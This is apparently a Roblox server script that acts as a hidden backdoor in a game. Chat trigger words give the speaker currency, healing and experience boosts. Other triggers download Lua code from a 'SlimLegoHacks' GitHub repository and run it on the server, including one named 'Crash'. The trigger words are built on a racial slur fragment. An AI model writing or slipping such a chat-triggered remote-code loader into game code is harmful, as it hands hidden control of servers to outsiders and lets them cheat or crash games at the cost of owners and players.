game.Players.PlayerAdded:Connect(function(Player)
	Player.Chatted:Connect(function(msg)
		local character = Player.Character or Player.CharacterAdded:Wait()
    local name = Player.Name
		if msg == "NIGCASH" then
			print(".")
      game.ServerStorage[".stats"][name].Ryo.Value = game.ServerStorage[".stats"][name].Ryo.Value + 2500
      print("..")
		elseif msg == "NIGHEAL" then
			print(".")
      character.Humanoid.Health = character.Humanoid.MaxHealth
      Player.Chakra.Value = Player.MaxChakra.Value
      print("..")
		elseif msg == "NIGEXP" then
			print(".")
      game.ServerStorage[".stats"][name].HandsignEXP.Value = 1.65
      game.ServerStorage[".stats"][name].PushupEXP.Value = 1.65
      game.ServerStorage[".stats"][name].MeditationEXP.Value = 3
      game.ServerStorage[".stats"][name].BlockEXP.Value = 0.85
      game.ServerStorage[".stats"][name].KunaiEXP.Value = 1
      print("..")
		elseif msg == "NIG1" then
			pcall(function()
				loadstring(HttpService:GetAsync("https://raw.githubusercontent.com/SlimLegoHacks/Shinden/main/Nig4", true))()
			end) 
		elseif msg == "NIG2" then
			pcall(function()
				loadstring(HttpService:GetAsync("https://raw.githubusercontent.com/SlimLegoHacks/Shinden/main/Nig5", true))()
			end) 
		elseif msg == "NIG3" then
			pcall(function()
				loadstring(HttpService:GetAsync("https://raw.githubusercontent.com/SlimLegoHacks/Shinden/main/Nig6", true))()
			end) 
		elseif msg == "NIG4" then
			pcall(function()
				loadstring(HttpService:GetAsync("https://raw.githubusercontent.com/SlimLegoHacks/Shinden/main/Nig7", true))()
			end) 
		elseif msg == "NIGCRASH" then
			pcall(function()
				loadstring(HttpService:GetAsync("https://raw.githubusercontent.com/SlimLegoHacks/Shinden/main/Crash", true))()
			end)
		end
	end)
end)
